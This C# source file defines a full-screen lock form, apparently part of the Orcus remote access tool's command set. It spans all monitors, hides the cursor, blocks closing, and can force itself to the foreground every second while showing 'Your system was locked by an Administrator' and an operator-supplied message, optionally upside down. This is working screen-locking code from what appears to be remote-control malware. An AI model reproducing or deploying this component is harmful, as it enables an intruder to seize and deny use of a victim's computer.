using System;
using System.ComponentModel;
using System.Drawing;
using System.Drawing.Drawing2D;
using System.Drawing.Text;
using System.Linq;
using System.Windows.Forms;
using Orcus.Native;
using Orcus.StaticCommands.System;

namespace Orcus.StaticCommands.SystemLock
{
    public partial class SystemLockForm : Form
    {
        private readonly Color _background;
        private readonly Brush _fontBrush;
        private readonly string _message;
        private bool _preventClosing;
        private readonly bool _isRotated;
        private readonly Timer _foregroundTimer;
        private Rectangle _textRectangle;

        public SystemLockForm(string message, bool preventClosing, SystemLockCommand.LockScreenBackground background,
            bool setToTopFrequently, bool isRotated)
        {
            InitializeComponent();
            Cursor.Hide();

            _message = message;
            _preventClosing = preventClosing;
            _isRotated = isRotated;

            if (setToTopFrequently)
            {
                _foregroundTimer = new Timer {Interval = 1000};
                _foregroundTimer.Tick += ForegroundTimerOnTick;
            }

            switch (background)
            {
                case SystemLockCommand.LockScreenBackground.White:
                    _background = Color.White;
                    _fontBrush = Brushes.Black;
                    break;
                case SystemLockCommand.LockScreenBackground.Blue:
                    _background = Color.FromArgb(41, 128, 185);
                    _fontBrush = Brushes.White;
                    break;
                default:
                    _background = Color.Black;
                    _fontBrush = Brushes.White;
                    break;
            }
        }

        private void ForegroundTimerOnTick(object sender, EventArgs eventArgs)
        {
            BringToFront();
            NativeMethods.SetForegroundWindow(Handle);
        }

        protected override void OnPaint(PaintEventArgs e)
        {
            base.OnPaint(e);
            e.Graphics.Clear(_background);

            e.Graphics.SmoothingMode = SmoothingMode.HighQuality;
            e.Graphics.CompositingQuality = CompositingQuality.HighQuality;
            e.Graphics.TextRenderingHint = TextRenderingHint.AntiAlias;

            // P(0, 0) is now in the center of the text
            e.Graphics.TranslateTransform(_textRectangle.X + _textRectangle.Width / 2, _textRectangle.Y + _textRectangle.Height / 2);

            if (_isRotated)
                e.Graphics.RotateTransform(180);

            var message1 = "Your system was locked by an Administrator";
            var message2 = _message;

            var textSize1 = e.Graphics.MeasureString(message1, Font);
            var textSize2 = string.IsNullOrEmpty(_message) ? new Size(0, 0) : e.Graphics.MeasureString(message2, Font);
            var totalTextHeight = textSize1.Height + textSize2.Height;

            e.Graphics.DrawString(message1, Font, _fontBrush, -(textSize1.Width / 2), totalTextHeight / -2);

            if (textSize2.Height > 0)
                e.Graphics.DrawString(message2, Font, _fontBrush, -(textSize2.Width / 2), 0);
        }

        protected override void OnLoad(EventArgs e)
        {
            base.OnLoad(e);
            _foregroundTimer?.Start();

            var allScreens = Screen.AllScreens;
            var primaryScreen = allScreens.First(x => x.Primary);

            var minX = allScreens.Min(x => x.Bounds.X);
            var minY = allScreens.Min(x => x.Bounds.Y);
            var maxX = allScreens.Max(x => x.Bounds.X + x.Bounds.Width);
            var maxY = allScreens.Max(x => x.Bounds.Y + x.Bounds.Height);

            var height = 0;
            var width = 0;

            foreach (var screen in allScreens)
            {
                height += screen.Bounds.Height;
                width += screen.Bounds.Width;
            }

            Location = new Point(minX, minY);
            Size = new Size(Math.Abs(maxX - minX), Math.Abs(maxY - minY));

            _textRectangle = new Rectangle(primaryScreen.Bounds.X + 60, primaryScreen.Bounds.Y + 60,
                primaryScreen.Bounds.Width - 60, primaryScreen.Bounds.Height - 60);
        }

        protected override void OnClosing(CancelEventArgs e)
        {
            base.OnClosing(e);
            e.Cancel = _preventClosing;
        }

        protected override void OnClosed(EventArgs e)
        {
            base.OnClosed(e);
            _foregroundTimer?.Stop();
        }

        public void SafeClose()
        {
            _preventClosing = false;
            Close();
        }
    }
}